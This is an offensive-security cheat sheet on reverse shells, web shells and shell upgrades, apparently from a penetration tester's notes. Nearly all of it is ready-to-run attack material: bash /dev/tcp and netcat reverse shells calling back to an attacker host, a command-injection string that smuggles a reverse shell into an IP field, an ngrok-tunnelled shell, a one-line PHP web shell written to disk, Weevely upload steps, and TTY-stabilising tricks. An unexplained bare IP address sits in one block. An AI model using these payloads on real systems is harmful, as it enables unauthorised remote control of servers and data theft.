# Webshells / revshells

> [Offensive Security Cheatsheet](https://cheatsheet.haax.fr/shells-methods/)

## Reverse Shell

### Ressources

* [https://cheatsheet.haax.fr/shells-methods/reverse/](https://cheatsheet.haax.fr/shells-methods/reverse/)
* [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [https://www.revshells.com/](https://www.revshells.com/)
* [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
* Metasploit
* [https://alamot.github.io/reverse\_shells/](https://alamot.github.io/reverse_shells/)
* [https://github.com/ShutdownRepo/shellerator](https://github.com/ShutdownRepo/shellerator)

### Basics / Classical

```bash
157.90.29.76

nc -nlvp 443
bash -i >& /dev/tcp/ATTACKING-IP/443 0>&1
nc -nlvp 443
127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKING-IP/443 0>&1'
```

### Reverse shell using ngrok <a href="#reverse-shell-using-ngrok" id="reverse-shell-using-ngrok"></a>

```bash
# On attacker (term1)
ngrok tcp 12345

# On attacker (term2)
nc -lvp 12345

# On target, use your reverse shell payload on the ngrok tunnel target
nc 0.tcp.ngrok.io <port> -e /bin/sh
```

## WebShells

### Ressources

* [https://github.com/tennc/webshell](https://github.com/tennc/webshell)
* Google / ChatGPT

### Basique PHP WebShell

```php
<?php system($_GET['cmd']); ?>
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Weevely <a href="#weevely" id="weevely"></a>

```bash
# Weevely is insane ! 
# It's like enhanced webshell which looks like a real shell

# First, generate a payload shell
weevely generate <password> <filename>

# Then upload the file or copy the code wherever you can
# Then you can just call your shell
weevely <url> <password
```

## Fully Interactive TTY Shell

#### MISC <a href="#misc" id="misc"></a>

```bash
# Another way to get a better shell
# script is almost everytime present on the machine
/usr/bin/script -qc /bin/bash /dev/null
```

### Fully Interactive TTY Shell <a href="#fully-interactive-tty-shell" id="fully-interactive-tty-shell"></a>

```bash
# Using STTY
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty -raw echo
OR
$ stty rows <num> columns <cols>
```

### Spawning a shell <a href="#spawning-a-shell" id="spawning-a-shell"></a>

```bash
# Using os.system
echo os.system('/bin/bash')

# Using interactive sh
/bin/sh -i

# Using Vi
:!bash
:set shell=/bin/bash:shell

perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh";
lua: os.execute('/bin/bash')
```
